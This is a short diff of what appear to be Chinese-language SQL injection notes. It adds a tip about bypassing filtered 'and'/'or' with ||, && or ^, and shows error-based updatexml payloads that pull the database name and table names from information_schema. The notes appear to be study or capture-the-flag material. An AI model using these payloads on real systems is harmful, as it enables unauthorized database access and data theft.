@@ -96,6 +96,7 @@ print("All:", column)
 再在另一个页面，如查询详细资料，修改信息提交前等，会查询出来并二次直接查询数据库，造成二次注入。
 一般是报错回显。
 ```
+and or 被过滤，使用||，&&，^等
 123"||(updatexml(1,concat('~',(select(database()))),1))#
 
 123"||(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))),1))#
